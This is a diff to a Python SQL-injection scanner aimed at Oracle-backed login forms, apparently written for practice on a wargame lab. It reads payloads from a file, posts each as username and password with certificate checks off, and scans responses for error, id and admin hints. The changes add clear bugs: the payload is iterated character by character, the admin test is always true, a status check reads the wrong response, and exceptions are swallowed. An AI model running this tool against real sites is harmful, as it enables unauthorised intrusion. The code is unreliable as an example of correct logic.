@@ -79,26 +79,25 @@ async def ORACLE_SQL_injection(urls):
         """This is the main block of our exploit program which sending the payloads. """
         global pattern,htmlpattern  
         done = False 
-        filename = "Oracleinj.txt" 
+        filename = "test.txt" 
         current_directory = os.path.dirname(os.path.abspath(__file__)) 
         file_path = os.path.join(current_directory, filename) 
 
         with open(file_path, "r") as file: 
             payload = file.read()
-            rows = payload.split("\n") 
+            rows = payload 
             sorted_rows = sorted(rows) 
             sorted_payload = "\n".join(sorted_rows) #* 
             print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
             requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
             # url = "https://redtiger.labs.overthewire.org/level1.php"
             req = requests.get(url=urls,verify=False) 
-            # assert req.status_code == 200
             if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                 logger.info("payload is ready to send.")
 
                 if ask.lower() == "y":
-                    for line in sorted_payload.split("\n"): 
+                    for line in sorted_payload: 
                         params = { 
                             "username": line,
                             "password": line
@@ -112,7 +111,8 @@ async def ORACLE_SQL_injection(urls):
                                 logger.info("Error parameter might exists in the code.")
                                 Detect(ack.text)
                                 await asyncio.sleep(3)
-                                html_response.push(str(ack.text),"error parameter found")
+                                html_response.Insert_to_stack(indx=0,value=str(ack.text))
+                                #capture will be recorded at index 0
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
@@ -120,13 +120,14 @@ async def ORACLE_SQL_injection(urls):
                                 logger.info("id parameter found.(might exists)")
                                 Detect(ack.text)
                                 await asyncio.sleep(3)
-                                html_response.push(str(ack.text),"id parameter found")
+                                html_response.Insert_to_stack(indx=1,value=str(ack.text))
+                                # value will be inserted a the index 1
                             
                             if htmlVULN:
                                 logger.info("error parameter founded in the code.(might exists)")
                                 Detect(ack.text)
                                 await asyncio.sleep(3)
-                                html_response.push(str(ack.text),"error parameter found")
+                                html_response.Insert_to_stack(indx=2,value=str(ack.text))
                             
                             word = "id" in req.text                             
                             errword = "error" in req.text
@@ -134,32 +135,32 @@ async def ORACLE_SQL_injection(urls):
                                 logger.info("Id parameter found in the code.(might exists)")
                                 Detect(ack.text)
                                 await asyncio.sleep(3)
-                                html_response.push(str(ack.text),"id parameter found")
+                                html_response.Insert_to_stack(indx=3,value=str(ack.text))
 
                             
                             if errword:
                                 logger.info("error parameter might exists")
                                 Detect(ack.text)
                                 await asyncio.sleep(3)
-                                html_response.push(str(ack.text),"Error parameter found")
+                                html_response.Insert_to_stack(indx=4,value=str(ack.text))
 
                             
                                 
                         if req.status_code == 302:                                             
                             logger.info("Could inject the keyword:",line)
-                            Significant_captures.push(f"Could find injectable area in {url}","keyword:",str(line))
+                            Significant_captures.Insert_to_stack(indx=0,value=str(ack.text))
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                             logger.info("Admin parameter might exists")
                             Detect(ack.text)
                             await asyncio.sleep(3)
-                            html_response.push(str(ack.text),"admin parameter found")
+                            html_response.Insert_to_stack(indx=6,value=str(ack.text))
                             
             else:
                 logger.error("Host is down")
         
-    except Exception as e:
-        logger.error(e)
+    except StopIteration:
+        pass
     
     except KeyboardInterrupt:
         logger.info("Aborted")
@@ -169,17 +170,23 @@ async def ORACLE_SQL_injection(urls):
         
     finally:
         try:
-            logger.info("Injection done!")
-            msg = str(html_response.display_all())
-            for cap in msg:
-                cap = cap.split("\n")
-                cap = sorted(cap)
-                print(msg[str(cap)])
-        
-        except TypeError:
-            msg = msg.split("\n")
-            msg = sorted(msg)
-            print("\n".join(msg))
+            for cap in html_response:
+                error_cap = cap[0]
+                id_cap = cap[1]
+                err_cap_html = cap[2]
+                id_html = cap[3]
+                err_cap_html_2 = cap[4]
+                sig_cap = Significant_captures[0]
+                admin_cap = cap[6]
+                logger.info(error_cap)
+                logger.info(id_cap)
+                logger.info(err_cap_html)
+                logger.info(id_html)
+                logger.info(err_cap_html_2)
+                logger.info(sig_cap)
+                logger.info(admin_cap)
+        except Exception:
+            raise
      
         
         
